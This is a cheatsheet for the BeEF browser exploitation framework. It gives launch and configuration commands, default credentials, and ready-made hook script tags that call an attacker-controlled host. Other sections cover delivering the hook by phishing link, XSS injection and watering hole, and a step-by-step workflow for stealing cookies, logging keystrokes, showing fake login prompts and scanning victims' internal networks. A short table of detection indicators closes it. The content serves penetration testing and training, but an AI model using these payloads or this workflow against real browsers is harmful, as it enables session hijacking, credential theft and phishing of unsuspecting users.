# BeEF Cheatsheet

## Quick Start

```bash
# Launch BeEF (Kali)
sudo beef-xss

# Start/stop service
sudo beef-xss-start
sudo beef-xss-stop

# Launch from source
git clone https://github.com/beefproject/beef.git
cd beef && ./install && ./beef
```

## Default Credentials

| Service | URL | Username | Password |
|---|---|---|---|
| Web UI | http://127.0.0.1:3000/ui/panel | beef | beef |

## The Hook

```html
<!-- Inject into any page to hook browsers -->
<script src="http://192.168.1.50:3000/hook.js"></script>
```

## Web UI Navigation

| Panel | Purpose |
|---|---|
| Hooked Browsers | List of all hooked browsers (left) |
| Current Browser | Selected browser details (top-right) |
| Command Modules | Available attack modules (bottom-right) |
| Command Results | Execution results for modules |

## Module Categories & Key Modules

### Browser
```bash
Get Browser Details    # Fingerprint browser, plugins, features
Get Cookies            # Extract session cookies
Get Page HTML          # Capture full page content
Get Window Size        # Detect screen resolution
Redirect Browser       # Navigate victim to URL
```

### Network
```bash
Internal Network Discovery  # Scan 192.168.x.x ranges
Ping Sweep                  # ICMP ping via JavaScript
Get Internal IP             # Extract local IP address
```

### Social Engineering
```bash
Pretty Theft                # Fake login prompt
Dialog boxes                # Alert/confirm/prompt dialogs
Fake Notification Bar       # Browser-like notification
```

### Host
```bash
Get System Info         # OS details, hardware info
Get Internal IP         # Local network address
Clipboard Hijacking     # Monitor clipboard content
Keystroke Logger        # Capture keyboard input
USB Detection           # Detect connected USB devices
```

### Exploitation
```bash
Java Vulnerability Check    # Test for Java plugin vulns
Adobe Reader Check          # Test for PDF plugin vulns
Metasploit Integration      # Chain to MSF exploits
```

### Persistence
```bash
Create Pop Under        # Hidden window with hook
iFrame Keylogger        # Persistent keystroke capture
QR Code                 # Hook URL as QR code
```

## REST API

```bash
# Authenticate
TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"beef","password":"beef"}' | jq -r '.token')

# List hooked browsers
curl -H "Authorization: Bearer $TOKEN" http://127.0.0.1:3000/api/v1/hooked-browsers

# Execute module
curl -X POST http://127.0.0.1:3000/api/v1/command/module/<MODULE_ID> \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"browser_id":"<ID>","data":{}}'
```

## Hook Delivery Methods

```bash
# 1. Phishing email link
<a href="http://attacker.com/hook-page.html">View Document</a>

# 2. XSS injection
<script>document.write('<script src="http://192.168.1.50:3000/hook.js"></script>')</script>

# 3. Watering hole
# Clone target site → inject hook → redirect DNS

# 4. QR code
# BeEF Extensions → QR Code Generator → enter hook URL

# 5. Test page (built-in)
http://192.168.1.50:3000/demos/basic.html
```

## Quick Attack Workflow

```
1. Start BeEF:              sudo beef-xss
2. Inject hook into page:   <script src="http://192.168.1.50:3000/hook.js"></script>
3. Wait for victim browser: Browser appears in Hooked Browsers panel
4. Get browser info:        Modules → Browser → Get Browser Details → Execute
5. Get cookies:             Modules → Browser → Get Cookies → Execute
6. Check network:           Modules → Network → Internal Network Discovery → Execute
7. Harvest credentials:     Modules → Social Engineering → Pretty Theft → Execute
8. Keylog:                  Modules → Host → Keystroke Logger → Execute
```

## Configuration

```bash
# Config file location
nano /usr/share/beef-xss/config.yaml

# Key settings
beef:
  http:
    host: "0.0.0.0"        # Bind address
    port: 3000              # Listen port
    allow_camouflage: true  # URL rewriting
  credential:
    username: "beef"        # Change this
    password: "beef"        # Change this
```

## Proxy Extension

```bash
# Enable in: Extensions → Proxy → Enable
# Configure browser: Proxy 127.0.0.1:6789
# Browse through victim's browser context
```

## Troubleshooting

```bash
# Service not running
sudo systemctl status beef-xss
sudo systemctl start beef-xss

# Port 3000 in use
sudo lsof -i :3000
sudo kill $(sudo lsof -t -i :3000)

# Hook not working
# Check if ad-blocker/script-blocker is active
# Test with clean browser profile
# Verify hook URL in page source (F12 → Elements)

# Reinstall
sudo apt reinstall beef-xss
# Or from source:
cd beef && ./install
```

## Detection Indicators

| IOC | Detail |
|---|---|
| Requests to `/hook.js` | Signature URL pattern |
| Regular polling to port 3000 | Browser ↔ BeEF communication |
| `window.beef` in JS context | Hooked browser marker |
| Cross-origin requests to non-standard ports | BeEF command execution |
